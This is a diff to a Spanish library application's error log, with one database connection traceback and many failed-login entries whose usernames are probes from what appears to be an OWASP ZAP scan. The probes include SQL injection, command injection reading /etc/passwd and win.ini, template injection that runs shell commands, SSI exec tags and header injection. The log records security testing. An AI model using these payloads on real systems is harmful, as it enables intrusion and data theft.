@@ -4,3 +4,344 @@
 2025-08-09 11:49:45 | ERROR | Datos incorrectos - Usuario: dawdaw
 2025-08-09 11:49:45 | ERROR | NoneType: None
 
+2025-09-23 09:34:50 | ERROR | invalid literal for int() with base 10: b'our'
+2025-09-23 09:34:50 | ERROR | Traceback (most recent call last):
+  File "C:\Users\Lenovo\Desktop\Proyecto Biblioteca\BibliotecaGM\src\database\db_sqlite.py", line 11, in conexion_BD
+    return sqlitecloud.connect(config('SQLITE_CLOUD_CONN'))
+           ~~~~~~~~~~~~~~~~~~~^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "C:\Users\Lenovo\Desktop\Proyecto Biblioteca\BibliotecaGM\venv\Lib\site-packages\sqlitecloud\dbapi2.py", line 180, in connect
+    driver.connect(config.account.hostname, config.account.port, config),
+    ~~~~~~~~~~~~~~^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "C:\Users\Lenovo\Desktop\Proyecto Biblioteca\BibliotecaGM\venv\Lib\site-packages\sqlitecloud\driver.py", line 64, in connect
+    self._internal_config_apply(connection, config)
+    ~~~~~~~~~~~~~~~~~~~~~~~~~~~^^^^^^^^^^^^^^^^^^^^
+  File "C:\Users\Lenovo\Desktop\Proyecto Biblioteca\BibliotecaGM\venv\Lib\site-packages\sqlitecloud\driver.py", line 469, in _internal_config_apply
+    self._internal_run_command(
+    ~~~~~~~~~~~~~~~~~~~~~~~~~~^
+        connection, self._internal_serialize_command(command)
+        ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+    )
+    ^
+  File "C:\Users\Lenovo\Desktop\Proyecto Biblioteca\BibliotecaGM\venv\Lib\site-packages\sqlitecloud\driver.py", line 487, in _internal_run_command
+    return self._internal_socket_read(connection, main_socket)
+           ~~~~~~~~~~~~~~~~~~~~~~~~~~^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "C:\Users\Lenovo\Desktop\Proyecto Biblioteca\BibliotecaGM\venv\Lib\site-packages\sqlitecloud\driver.py", line 572, in _internal_socket_read
+    command_length = int(command_length_value)
+ValueError: invalid literal for int() with base 10: b'our'
+
+2025-09-28 16:16:49 | ERROR | Datos incorrectos - Usuario: sergio
+2025-09-28 16:17:01 | ERROR | Datos incorrectos - Usuario: http://www.google.com/
+2025-09-28 16:17:01 | ERROR | Datos incorrectos - Usuario: http://www.google.com:80/
+2025-09-28 16:17:01 | ERROR | Datos incorrectos - Usuario: http://www.google.com
+2025-09-28 16:17:01 | ERROR | Datos incorrectos - Usuario: http://www.google.com/search?q=ZAP
+2025-09-28 16:17:01 | ERROR | Datos incorrectos - Usuario: http://www.google.com:80/search?q=ZAP
+2025-09-28 16:17:01 | ERROR | Datos incorrectos - Usuario: www.google.com/
+2025-09-28 16:17:01 | ERROR | Datos incorrectos - Usuario: www.google.com:80/
+2025-09-28 16:17:01 | ERROR | Datos incorrectos - Usuario: www.google.com
+2025-09-28 16:17:01 | ERROR | Datos incorrectos - Usuario: www.google.com/search?q=ZAP
+2025-09-28 16:17:01 | ERROR | Datos incorrectos - Usuario: www.google.com:80/search?q=ZAP
+2025-09-28 16:17:01 | ERROR | Datos incorrectos - Usuario: sergio
+2025-09-28 16:17:01 | ERROR | Datos incorrectos - Usuario: sergio
+2025-09-28 16:17:01 | ERROR | Datos incorrectos - Usuario: sergio
+2025-09-28 16:17:01 | ERROR | Datos incorrectos - Usuario: sergio
+2025-09-28 16:17:01 | ERROR | Datos incorrectos - Usuario: sergio
+2025-09-28 16:17:01 | ERROR | Datos incorrectos - Usuario: sergio
+2025-09-28 16:17:01 | ERROR | Datos incorrectos - Usuario: sergio
+2025-09-28 16:17:01 | ERROR | Datos incorrectos - Usuario: sergio
+2025-09-28 16:17:01 | ERROR | Datos incorrectos - Usuario: sergio
+2025-09-28 16:17:01 | ERROR | Datos incorrectos - Usuario: sergio
+2025-09-28 16:17:06 | ERROR | Datos incorrectos - Usuario: 7260979824328720794.owasp.org
+2025-09-28 16:17:06 | ERROR | Datos incorrectos - Usuario: https://7260979824328720794.owasp.org
+2025-09-28 16:17:06 | ERROR | Datos incorrectos - Usuario: https://7260979824328720794%2eowasp%2eorg
+2025-09-28 16:17:06 | ERROR | Datos incorrectos - Usuario: 5;URL='https://7260979824328720794.owasp.org'
+2025-09-28 16:17:06 | ERROR | Datos incorrectos - Usuario: URL='http://7260979824328720794.owasp.org'
+2025-09-28 16:17:06 | ERROR | Datos incorrectos - Usuario: https://7260979824328720794.owasp.org/?sergio
+2025-09-28 16:17:06 | ERROR | Datos incorrectos - Usuario: 5;URL='https://7260979824328720794.owasp.org/?sergio'
+2025-09-28 16:17:06 | ERROR | Datos incorrectos - Usuario: https://\7260979824328720794.owasp.org
+2025-09-28 16:17:06 | ERROR | Datos incorrectos - Usuario: http://\7260979824328720794.owasp.org
+2025-09-28 16:17:06 | ERROR | Datos incorrectos - Usuario: sergio
+2025-09-28 16:17:06 | ERROR | Datos incorrectos - Usuario: sergio
+2025-09-28 16:17:06 | ERROR | Datos incorrectos - Usuario: sergio
+2025-09-28 16:17:06 | ERROR | Datos incorrectos - Usuario: sergio
+2025-09-28 16:17:06 | ERROR | Datos incorrectos - Usuario: sergio
+2025-09-28 16:17:06 | ERROR | Datos incorrectos - Usuario: sergio
+2025-09-28 16:17:06 | ERROR | Datos incorrectos - Usuario: sergio
+2025-09-28 16:17:06 | ERROR | Datos incorrectos - Usuario: sergio
+2025-09-28 16:17:06 | ERROR | Datos incorrectos - Usuario: sergio
+2025-09-28 16:17:10 | ERROR | Datos incorrectos - Usuario: <!--#EXEC cmd="ls /"-->
+2025-09-28 16:17:10 | ERROR | Datos incorrectos - Usuario: "><!--#EXEC cmd="ls /"--><
+2025-09-28 16:17:10 | ERROR | Datos incorrectos - Usuario: <!--#EXEC cmd="dir \"-->
+2025-09-28 16:17:10 | ERROR | Datos incorrectos - Usuario: "><!--#EXEC cmd="dir \"--><
+2025-09-28 16:17:10 | ERROR | Datos incorrectos - Usuario: sergio
+2025-09-28 16:17:10 | ERROR | Datos incorrectos - Usuario: sergio
+2025-09-28 16:17:10 | ERROR | Datos incorrectos - Usuario: sergio
+2025-09-28 16:17:10 | ERROR | Datos incorrectos - Usuario: sergio
+2025-09-28 16:17:13 | ERROR | Datos incorrectos - Usuario: '
+2025-09-28 16:17:13 | ERROR | Datos incorrectos - Usuario: sergio'
+2025-09-28 16:17:13 | ERROR | Datos incorrectos - Usuario: "
+2025-09-28 16:17:13 | ERROR | Datos incorrectos - Usuario: sergio"
+2025-09-28 16:17:13 | ERROR | Datos incorrectos - Usuario: ;
+2025-09-28 16:17:13 | ERROR | Datos incorrectos - Usuario: sergio;
+2025-09-28 16:17:13 | ERROR | Datos incorrectos - Usuario: '(
+2025-09-28 16:17:13 | ERROR | Datos incorrectos - Usuario: sergio'(
+2025-09-28 16:17:13 | ERROR | Datos incorrectos - Usuario: sergio
+2025-09-28 16:17:13 | ERROR | Datos incorrectos - Usuario: sergio
+2025-09-28 16:17:13 | ERROR | Datos incorrectos - Usuario: sergio AND 1=1 -- 
+2025-09-28 16:17:13 | ERROR | Datos incorrectos - Usuario: sergio AND 1=2 -- 
+2025-09-28 16:17:13 | ERROR | Datos incorrectos - Usuario: sergio OR 1=1 -- 
+2025-09-28 16:17:13 | ERROR | Datos incorrectos - Usuario: sergio' AND '1'='1' -- 
+2025-09-28 16:17:13 | ERROR | Datos incorrectos - Usuario: sergio' AND '1'='2' -- 
+2025-09-28 16:17:13 | ERROR | Datos incorrectos - Usuario: sergio' OR '1'='1' -- 
+2025-09-28 16:17:13 | ERROR | Datos incorrectos - Usuario: sergio UNION ALL select NULL -- 
+2025-09-28 16:17:13 | ERROR | Datos incorrectos - Usuario: sergio' UNION ALL select NULL -- 
+2025-09-28 16:17:13 | ERROR | Datos incorrectos - Usuario: sergio" UNION ALL select NULL -- 
+2025-09-28 16:17:13 | ERROR | Datos incorrectos - Usuario: sergio) UNION ALL select NULL -- 
+2025-09-28 16:17:13 | ERROR | Datos incorrectos - Usuario: sergio') UNION ALL select NULL -- 
+2025-09-28 16:17:13 | ERROR | Datos incorrectos - Usuario: sergio
+2025-09-28 16:17:13 | ERROR | Datos incorrectos - Usuario: sergio
+2025-09-28 16:17:13 | ERROR | Datos incorrectos - Usuario: sergio
+2025-09-28 16:17:13 | ERROR | Datos incorrectos - Usuario: sergio
+2025-09-28 16:17:13 | ERROR | Datos incorrectos - Usuario: sergio
+2025-09-28 16:17:13 | ERROR | Datos incorrectos - Usuario: sergio
+2025-09-28 16:17:13 | ERROR | Datos incorrectos - Usuario: sergio
+2025-09-28 16:17:13 | ERROR | Datos incorrectos - Usuario: sergio
+2025-09-28 16:17:14 | ERROR | Datos incorrectos - Usuario: sergio
+2025-09-28 16:17:14 | ERROR | Datos incorrectos - Usuario: sergio
+2025-09-28 16:17:14 | ERROR | Datos incorrectos - Usuario: sergio
+2025-09-28 16:17:14 | ERROR | Datos incorrectos - Usuario: sergio
+2025-09-28 16:17:14 | ERROR | Datos incorrectos - Usuario: sergio
+2025-09-28 16:17:14 | ERROR | Datos incorrectos - Usuario: sergio
+2025-09-28 16:17:14 | ERROR | Datos incorrectos - Usuario: sergio
+2025-09-28 16:17:14 | ERROR | Datos incorrectos - Usuario: sergio
+2025-09-28 16:17:14 | ERROR | Datos incorrectos - Usuario: sergio
+2025-09-28 16:17:14 | ERROR | Datos incorrectos - Usuario: sergio
+2025-09-28 16:17:14 | ERROR | Datos incorrectos - Usuario: sergio
+2025-09-28 16:17:14 | ERROR | Datos incorrectos - Usuario: sergio
+2025-09-28 16:17:14 | ERROR | Datos incorrectos - Usuario: sergio
+2025-09-28 16:17:14 | ERROR | Datos incorrectos - Usuario: sergio
+2025-09-28 16:17:14 | ERROR | Datos incorrectos - Usuario: sergio
+2025-09-28 16:17:21 | ERROR | Datos incorrectos - Usuario: ";print(chr(122).chr(97).chr(112).chr(95).chr(116).chr(111).chr(107).chr(101).chr(110));$var="
+2025-09-28 16:17:21 | ERROR | Datos incorrectos - Usuario: ';print(chr(122).chr(97).chr(112).chr(95).chr(116).chr(111).chr(107).chr(101).chr(110));$var='
+2025-09-28 16:17:21 | ERROR | Datos incorrectos - Usuario: ${@print(chr(122).chr(97).chr(112).chr(95).chr(116).chr(111).chr(107).chr(101).chr(110))}
+2025-09-28 16:17:21 | ERROR | Datos incorrectos - Usuario: ${@print(chr(122).chr(97).chr(112).chr(95).chr(116).chr(111).chr(107).chr(101).chr(110))}\
+2025-09-28 16:17:21 | ERROR | Datos incorrectos - Usuario: ;print(chr(122).chr(97).chr(112).chr(95).chr(116).chr(111).chr(107).chr(101).chr(110));
+2025-09-28 16:17:21 | ERROR | Datos incorrectos - Usuario: "+response.write(192,831*814,959)+"
+2025-09-28 16:17:21 | ERROR | Datos incorrectos - Usuario: +response.write({0}*{1})+
+2025-09-28 16:17:21 | ERROR | Datos incorrectos - Usuario: response.write(192,831*814,959)
+2025-09-28 16:17:21 | ERROR | Datos incorrectos - Usuario: sergio
+2025-09-28 16:17:21 | ERROR | Datos incorrectos - Usuario: sergio
+2025-09-28 16:17:21 | ERROR | Datos incorrectos - Usuario: sergio
+2025-09-28 16:17:21 | ERROR | Datos incorrectos - Usuario: sergio
+2025-09-28 16:17:21 | ERROR | Datos incorrectos - Usuario: sergio
+2025-09-28 16:17:21 | ERROR | Datos incorrectos - Usuario: sergio
+2025-09-28 16:17:21 | ERROR | Datos incorrectos - Usuario: sergio
+2025-09-28 16:17:21 | ERROR | Datos incorrectos - Usuario: sergio
+2025-09-28 16:17:25 | ERROR | Datos incorrectos - Usuario: cat /etc/passwd
+2025-09-28 16:17:25 | ERROR | Datos incorrectos - Usuario: sergio&cat /etc/passwd&
+2025-09-28 16:17:25 | ERROR | Datos incorrectos - Usuario: sergio;cat /etc/passwd;
+2025-09-28 16:17:25 | ERROR | Datos incorrectos - Usuario: sergio"&cat /etc/passwd&"
+2025-09-28 16:17:25 | ERROR | Datos incorrectos - Usuario: sergio";cat /etc/passwd;"
+2025-09-28 16:17:25 | ERROR | Datos incorrectos - Usuario: sergio'&cat /etc/passwd&'
+2025-09-28 16:17:25 | ERROR | Datos incorrectos - Usuario: sergio';cat /etc/passwd;'
+2025-09-28 16:17:25 | ERROR | Datos incorrectos - Usuario: type %SYSTEMROOT%\win.ini
+2025-09-28 16:17:25 | ERROR | Datos incorrectos - Usuario: sergio&type %SYSTEMROOT%\win.ini
+2025-09-28 16:17:25 | ERROR | Datos incorrectos - Usuario: sergio|type %SYSTEMROOT%\win.ini
+2025-09-28 16:17:25 | ERROR | Datos incorrectos - Usuario: sergio"&type %SYSTEMROOT%\win.ini&"
+2025-09-28 16:17:25 | ERROR | Datos incorrectos - Usuario: sergio"|type %SYSTEMROOT%\win.ini
+2025-09-28 16:17:25 | ERROR | Datos incorrectos - Usuario: sergio'&type %SYSTEMROOT%\win.ini&'
+2025-09-28 16:17:25 | ERROR | Datos incorrectos - Usuario: sergio'|type %SYSTEMROOT%\win.ini
+2025-09-28 16:17:25 | ERROR | Datos incorrectos - Usuario: get-help
+2025-09-28 16:17:25 | ERROR | Datos incorrectos - Usuario: sergio;get-help
+2025-09-28 16:17:25 | ERROR | Datos incorrectos - Usuario: sergio";get-help
+2025-09-28 16:17:25 | ERROR | Datos incorrectos - Usuario: sergio';get-help
+2025-09-28 16:17:25 | ERROR | Datos incorrectos - Usuario: sergio;get-help #
+2025-09-28 16:17:25 | ERROR | Datos incorrectos - Usuario: sergio
+2025-09-28 16:17:25 | ERROR | Datos incorrectos - Usuario: sergio
+2025-09-28 16:17:25 | ERROR | Datos incorrectos - Usuario: sergio
+2025-09-28 16:17:25 | ERROR | Datos incorrectos - Usuario: sergio
+2025-09-28 16:17:25 | ERROR | Datos incorrectos - Usuario: sergio
+2025-09-28 16:17:25 | ERROR | Datos incorrectos - Usuario: sergio
+2025-09-28 16:17:25 | ERROR | Datos incorrectos - Usuario: sergio
+2025-09-28 16:17:25 | ERROR | Datos incorrectos - Usuario: sergio
+2025-09-28 16:17:26 | ERROR | Datos incorrectos - Usuario: sergio
+2025-09-28 16:17:26 | ERROR | Datos incorrectos - Usuario: sergio
+2025-09-28 16:17:26 | ERROR | Datos incorrectos - Usuario: sergio
+2025-09-28 16:17:26 | ERROR | Datos incorrectos - Usuario: sergio
+2025-09-28 16:17:26 | ERROR | Datos incorrectos - Usuario: sergio
+2025-09-28 16:17:26 | ERROR | Datos incorrectos - Usuario: sergio
+2025-09-28 16:17:26 | ERROR | Datos incorrectos - Usuario: sergio
+2025-09-28 16:17:26 | ERROR | Datos incorrectos - Usuario: sergio
+2025-09-28 16:17:26 | ERROR | Datos incorrectos - Usuario: sergio
+2025-09-28 16:17:26 | ERROR | Datos incorrectos - Usuario: sergio
+2025-09-28 16:17:26 | ERROR | Datos incorrectos - Usuario: sergio
+2025-09-28 16:17:33 | ERROR | Datos incorrectos - Usuario: "'
+2025-09-28 16:17:33 | ERROR | Datos incorrectos - Usuario: <!--
+2025-09-28 16:17:33 | ERROR | Datos incorrectos - Usuario: ]]>
+2025-09-28 16:17:33 | ERROR | Datos incorrectos - Usuario: sergio
+2025-09-28 16:17:33 | ERROR | Datos incorrectos - Usuario: sergio
+2025-09-28 16:17:33 | ERROR | Datos incorrectos - Usuario: sergio
+2025-09-28 16:17:35 | ERROR | Datos incorrectos - Usuario: zj 3848*8097 zj
+2025-09-28 16:17:35 | ERROR | Datos incorrectos - Usuario: zj{2774*8363}zj
+2025-09-28 16:17:35 | ERROR | Datos incorrectos - Usuario: zj${1150*1250}zj
+2025-09-28 16:17:35 | ERROR | Datos incorrectos - Usuario: zj#{6731*5690}zj
+2025-09-28 16:17:35 | ERROR | Datos incorrectos - Usuario: zj{#5867*6164}zj
+2025-09-28 16:17:35 | ERROR | Datos incorrectos - Usuario: zj{@8628*5646}zj
+2025-09-28 16:17:35 | ERROR | Datos incorrectos - Usuario: zj{{3793*8526}}zj
+2025-09-28 16:17:35 | ERROR | Datos incorrectos - Usuario: zj{{=7524*3127}}zj
+2025-09-28 16:17:35 | ERROR | Datos incorrectos - Usuario: zj<%=2613*9070%>zj
+2025-09-28 16:17:35 | ERROR | Datos incorrectos - Usuario: zj#set($x=3334*2225)${x}zj
+2025-09-28 16:17:35 | ERROR | Datos incorrectos - Usuario: zj<p th:text="${7256*6216}"></p>zj
+2025-09-28 16:17:35 | ERROR | Datos incorrectos - Usuario: zj{@math key="4533" method="multiply" operand="7336"/}zj
+2025-09-28 16:17:35 | ERROR | Datos incorrectos - Usuario: zj{{49920|add:89480}}zj
+2025-09-28 16:17:35 | ERROR | Datos incorrectos - Usuario: zj{{print "9471" "6322"}}zj
+2025-09-28 16:17:35 | ERROR | Datos incorrectos - Usuario: sergio
+2025-09-28 16:17:35 | ERROR | Datos incorrectos - Usuario: sergio
+2025-09-28 16:17:35 | ERROR | Datos incorrectos - Usuario: sergio
+2025-09-28 16:17:35 | ERROR | Datos incorrectos - Usuario: sergio
+2025-09-28 16:17:36 | ERROR | Datos incorrectos - Usuario: sergio
+2025-09-28 16:17:36 | ERROR | Datos incorrectos - Usuario: sergio
+2025-09-28 16:17:36 | ERROR | Datos incorrectos - Usuario: sergio
+2025-09-28 16:17:36 | ERROR | Datos incorrectos - Usuario: sergio
+2025-09-28 16:17:36 | ERROR | Datos incorrectos - Usuario: sergio
+2025-09-28 16:17:36 | ERROR | Datos incorrectos - Usuario: sergio
+2025-09-28 16:17:36 | ERROR | Datos incorrectos - Usuario: sergio
+2025-09-28 16:17:36 | ERROR | Datos incorrectos - Usuario: sergio
+2025-09-28 16:17:36 | ERROR | Datos incorrectos - Usuario: sergio
+2025-09-28 16:17:36 | ERROR | Datos incorrectos - Usuario: sergio
+2025-09-28 16:17:41 | ERROR | Datos incorrectos - Usuario: <#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("sleep 15") }
+2025-09-28 16:17:41 | ERROR | Datos incorrectos - Usuario: #set($engine="")
+#set($proc=$engine.getClass().forName("java.lang.Runtime").getRuntime().exec("sleep 15"))
+#set($null=$proc.waitFor())
+${null}
+2025-09-28 16:17:41 | ERROR | Datos incorrectos - Usuario: {{= global.process.mainModule.require('child_process').execSync('sleep 15').toString() }}
+2025-09-28 16:17:41 | ERROR | Datos incorrectos - Usuario: <%= global.process.mainModule.require('child_process').execSync('sleep 15').toString()%>
+2025-09-28 16:17:41 | ERROR | Datos incorrectos - Usuario: #{global.process.mainModule.require('child_process').execSync('sleep 15').toString()}
+2025-09-28 16:17:41 | ERROR | Datos incorrectos - Usuario: {{range.constructor("return eval(\"global.process.mainModule.require('child_process').execSync('sleep 15').toString()\")")()}}
+2025-09-28 16:17:41 | ERROR | Datos incorrectos - Usuario: {{"".__class__.__mro__[1].__subclasses__()[157].__repr__.__globals__.get("__builtins__").get("__import__")("subprocess").check_output("sleep 15")}}
+2025-09-28 16:17:41 | ERROR | Datos incorrectos - Usuario: ${__import__("subprocess").check_output("sleep 15", shell=True)}
+2025-09-28 16:17:41 | ERROR | Datos incorrectos - Usuario: {{__import__("subprocess").check_output("sleep 15", shell=True)}}
+2025-09-28 16:17:41 | ERROR | Datos incorrectos - Usuario: <%=%x(sleep 15)%>
+2025-09-28 16:17:41 | ERROR | Datos incorrectos - Usuario: #{%x(sleep 15)}
+2025-09-28 16:17:41 | ERROR | Datos incorrectos - Usuario: {system("sleep 15")}
+2025-09-28 16:17:41 | ERROR | Datos incorrectos - Usuario: sergio
+2025-09-28 16:17:41 | ERROR | Datos incorrectos - Usuario: sergio
+2025-09-28 16:17:41 | ERROR | Datos incorrectos - Usuario: sergio
+2025-09-28 16:17:41 | ERROR | Datos incorrectos - Usuario: sergio
+2025-09-28 16:17:41 | ERROR | Datos incorrectos - Usuario: sergio
+2025-09-28 16:17:42 | ERROR | Datos incorrectos - Usuario: sergio
+2025-09-28 16:17:42 | ERROR | Datos incorrectos - Usuario: sergio
+2025-09-28 16:17:42 | ERROR | Datos incorrectos - Usuario: sergio
+2025-09-28 16:17:42 | ERROR | Datos incorrectos - Usuario: sergio
+2025-09-28 16:17:42 | ERROR | Datos incorrectos - Usuario: sergio
+2025-09-28 16:17:42 | ERROR | Datos incorrectos - Usuario: sergio
+2025-09-28 16:17:42 | ERROR | Datos incorrectos - Usuario: sergio
+2025-09-28 16:17:46 | ERROR | Datos incorrectos - Usuario: sergio&sleep 15.0&
+2025-09-28 16:17:46 | ERROR | Datos incorrectos - Usuario: sergio;sleep 15.0;
+2025-09-28 16:17:46 | ERROR | Datos incorrectos - Usuario: sergio"&sleep 15.0&"
+2025-09-28 16:17:46 | ERROR | Datos incorrectos - Usuario: sergio";sleep 15.0;"
+2025-09-28 16:17:46 | ERROR | Datos incorrectos - Usuario: sergio'&sleep 15.0&'
+2025-09-28 16:17:46 | ERROR | Datos incorrectos - Usuario: sergio';sleep 15.0;'
+2025-09-28 16:17:47 | ERROR | Datos incorrectos - Usuario: sergio&timeout /T 15.0
+2025-09-28 16:17:47 | ERROR | Datos incorrectos - Usuario: sergio|timeout /T 15.0
+2025-09-28 16:17:47 | ERROR | Datos incorrectos - Usuario: sergio"&timeout /T 15.0&"
+2025-09-28 16:17:47 | ERROR | Datos incorrectos - Usuario: sergio"|timeout /T 15.0
+2025-09-28 16:17:47 | ERROR | Datos incorrectos - Usuario: sergio'&timeout /T 15.0&'
+2025-09-28 16:17:47 | ERROR | Datos incorrectos - Usuario: sergio'|timeout /T 15.0
+2025-09-28 16:17:47 | ERROR | Datos incorrectos - Usuario: sergio;start-sleep -s 15.0
+2025-09-28 16:17:47 | ERROR | Datos incorrectos - Usuario: sergio";start-sleep -s 15.0
+2025-09-28 16:17:47 | ERROR | Datos incorrectos - Usuario: sergio';start-sleep -s 15.0
+2025-09-28 16:17:47 | ERROR | Datos incorrectos - Usuario: sergio;start-sleep -s 15.0 #
+2025-09-28 16:17:47 | ERROR | Datos incorrectos - Usuario: sergio
+2025-09-28 16:17:47 | ERROR | Datos incorrectos - Usuario: sergio
+2025-09-28 16:17:47 | ERROR | Datos incorrectos - Usuario: sergio
+2025-09-28 16:17:47 | ERROR | Datos incorrectos - Usuario: sergio
+2025-09-28 16:17:47 | ERROR | Datos incorrectos - Usuario: sergio
+2025-09-28 16:17:47 | ERROR | Datos incorrectos - Usuario: sergio
+2025-09-28 16:17:47 | ERROR | Datos incorrectos - Usuario: sergio
+2025-09-28 16:17:47 | ERROR | Datos incorrectos - Usuario: sergio
+2025-09-28 16:17:47 | ERROR | Datos incorrectos - Usuario: sergio
+2025-09-28 16:17:47 | ERROR | Datos incorrectos - Usuario: sergio
+2025-09-28 16:17:47 | ERROR | Datos incorrectos - Usuario: sergio
+2025-09-28 16:17:47 | ERROR | Datos incorrectos - Usuario: sergio
+2025-09-28 16:17:47 | ERROR | Datos incorrectos - Usuario: sergio
+2025-09-28 16:17:47 | ERROR | Datos incorrectos - Usuario: sergio
+2025-09-28 16:17:47 | ERROR | Datos incorrectos - Usuario: sergio
+2025-09-28 16:17:47 | ERROR | Datos incorrectos - Usuario: sergio
+2025-09-28 16:17:55 | ERROR | Datos incorrectos - Usuario: uqvfDUsGhCpeHWOOGOeicXEmJxQnYgeKGCIGepfEKAJMnfTXwaihMHhhFBejQsyjnpftfoCqUtNcZkmXdaRTqxZKiobMGmZSXNbxMTXstHNXLmGEIJkRnOjDFImJqdDOOGNTrmMVVTfKqKmhSbAgTPxqoIymJXwBAttrCFBVLVArThXdxaZIXBBRfbtByJWGbVfQCJohywjyWNFvtkWTmJifXnGyFgemIbGVPZhErjvYvVJlQMJcVNRZmiZbqBNNLImjLApiSfNObbhKStEQdKxglxlROjWIPtGrnBNYUXcvnFMYafSUKJlvqeIFHtHpWZZgMXXhpZCSMypPQdCaZiydJVqMFZimsaTQfxEUSpCkHcNvZXnKjnNDYFqfAkZsjnGjZsFfGrKyLIuqNtoPZnyDPeQAqRuCcDipWFcleiPXwXNHigaPoRSXcwJOMrjaxMwyKijhhuhPsbiVqjYQovVDKAEUfOQXcCvpSCVcpwKLHqMVGFaTyoKvmivhtwptIUHsncFCjmoNMjkIhHEnVWkEwqltcFBhnmxLVHqfBrVDIaDgnAfuEutEuQLDYBnvPUMnhlujJVGZaeLiBydxCpTwCUydbgYSyUlkLyAcgkQsevVEEtthYldReWflgDjlQZOyKgPrmjevDpTVgvjvMwPcydvuKOgMGsxyFDbvhYTvpvgkPvutxfLDASyugrpbuxDHYTOpLRHugOlDQccZUsgCXxekcBiHrUuCKPXKZEJlFeHfDfbapWXPxHWAcUobrZeObMOCibkNZIBTvSJyQUaTcJoqxZEDnVadpKTlFSAoNChQejbHGWyAmWPuJvmeoFfKGZdmNWFqCQtPiUbqNHZdsksnqNMoqomSefPEWJQZXtIbTsoTMtmuyRUVOdanBIhXnhREdSclmuwBJWAsopKDsxSndFuylHNqjIUSfHHcdShaCxIKxheUXKWNNxquCgaJBRnkVFpSJSPOwSriuHwLTcPYWQLwcygPTPcBqWuSqGkxDnDbDKRPsColMMOQNNtoKBCdEkPgUhWacvNSPTeelyFpYbmqooLnxlOPeIFEcwxhDCSgNoyZtLRgBpBaUrVSgphFFWmgLISNVyZZSASHciZAbPWHkITvhHFdFOeRAQieWQbpDapprbacbUJQammvxrRJbKGjHRIvXGaEuUyAkSLAKeFeCVvEEmCppfrZuaPBBkhZJPWEGmlahCpNlhksjMxdqoEWfrSDaVRatItrGwtpJclSDjFSYICRjFTyQoXUlfDFGxHfWsDwXSSHawrZFawfJLAtIVweZISFQTyJqWNgaeGaMTCUpJpqwqODkqJmeUCOcVcorUmIfJgwVlOQFyaRejiFgkPYyGfDDKJUaWRdKMwNDuqtIEwYdggZkuJYEkIJRTZJnyVxcatMloGfGlnYsJkbxZtRktACNxwehAacQByCZBHRrkFSmHEYnWjxYMXxfmrnPoRjwiYNTkaMDSYNQJVAhRIBDHWxBctpqGMZqNrvHOibVdmkMJhLdPBZiIXOnjqQqunarNRbBSiLAMqGhQXdvFqoMRZYGMjhtFmahxSQoGNmRBcTrYIsqFTtSnyZDDcZflVhjgihHlAhExZiUWilHjhsRGlWmBElyWUpfVcPBGbrDLLfdVTGNkmBoOUVjqSRqHrtYjEVlAskcRslVpAYXQALCGJQQmnBCAkUIfhkRFUxeomRBjflAJErApTimDRAAOYmQFHOwjnOXtQjmLYYBWmCMgdaMNDknbkHxAtqbuKATXXsxtjLLxUWCDfrIBUZhGNahiFYnFTnNWZCtXRIDxqNJPvNYuCITvbswrdULayhInRByMZdaZxJqFtEouKJjykIswdNFiiUgUMZYXnQMMMQwdevWVpsniLqFORXDEhtObTgCpjUkDcxvjWomWDNYVSBpGDnTBNvPhuPAKFdOyXnyIkrcgftPfDJQVaHZqwaKZoreyEVCoQihCTCeCDgBUZiyeawntPgUBTJqeJAXkjTBWJInyRnYRcRPyOXPYWvgKTinjaeETXEdVwMZHgfTmLywoMiZIfTARCvjuLvQaODLTBTwFsHLSKPmwCLEmITwIHskqtpcaKMEGhu
+2025-09-28 16:17:55 | ERROR | Datos incorrectos - Usuario: sergio
+2025-09-28 16:17:55 | ERROR | Datos incorrectos - Usuario: ZAP
+2025-09-28 16:17:55 | ERROR | Datos incorrectos - Usuario: ZAP%n%s%n%s%n%s%n%s%n%s%n%s%n%s%n%s%n%s%n%s%n%s%n%s%n%s%n%s%n%s%n%s%n%s%n%s%n%s%n%s
+
+2025-09-28 16:17:55 | ERROR | Datos incorrectos - Usuario: ZAP %1!s%2!s%3!s%4!s%5!s%6!s%7!s%8!s%9!s%10!s%11!s%12!s%13!s%14!s%15!s%16!s%17!s%18!s%19!s%20!s%21!n%22!n%23!n%24!n%25!n%26!n%27!n%28!n%29!n%30!n%31!n%32!n%33!n%34!n%35!n%36!n%37!n%38!n%39!n%40!n
+
+2025-09-28 16:17:56 | ERROR | Datos incorrectos - Usuario: sergio
+2025-09-28 16:17:56 | ERROR | Datos incorrectos - Usuario: sergio
+2025-09-28 16:17:56 | ERROR | Datos incorrectos - Usuario: sergio
+2025-09-28 16:17:57 | ERROR | Datos incorrectos - Usuario: Set-cookie: Tamper=8bb209ca-ce78-49df-aab0-24f6d700d790
+2025-09-28 16:17:57 | ERROR | Datos incorrectos - Usuario: any
+Set-cookie: Tamper=8bb209ca-ce78-49df-aab0-24f6d700d790
+2025-09-28 16:17:57 | ERROR | Datos incorrectos - Usuario: any?
+Set-cookie: Tamper=8bb209ca-ce78-49df-aab0-24f6d700d790
+2025-09-28 16:17:57 | ERROR | Datos incorrectos - Usuario: any
+Set-cookie: Tamper=8bb209ca-ce78-49df-aab0-24f6d700d790
+2025-09-28 16:17:57 | ERROR | Datos incorrectos - Usuario: any?
+Set-cookie: Tamper=8bb209ca-ce78-49df-aab0-24f6d700d790
+2025-09-28 16:17:57 | ERROR | Datos incorrectos - Usuario: any
+Set-cookie: Tamper=8bb209ca-ce78-49df-aab0-24f6d700d790
+
+2025-09-28 16:17:57 | ERROR | Datos incorrectos - Usuario: any?
+Set-cookie: Tamper=8bb209ca-ce78-49df-aab0-24f6d700d790
+
+2025-09-28 16:17:57 | ERROR | Datos incorrectos - Usuario: sergio
+2025-09-28 16:17:57 | ERROR | Datos incorrectos - Usuario: sergio
+2025-09-28 16:17:57 | ERROR | Datos incorrectos - Usuario: sergio
+2025-09-28 16:17:57 | ERROR | Datos incorrectos - Usuario: sergio
+2025-09-28 16:17:57 | ERROR | Datos incorrectos - Usuario: sergio
+2025-09-28 16:17:57 | ERROR | Datos incorrectos - Usuario: sergio
+2025-09-28 16:17:57 | ERROR | Datos incorrectos - Usuario: sergio
+2025-09-28 16:18:00 | ERROR | Datos incorrectos - Usuario: sergio
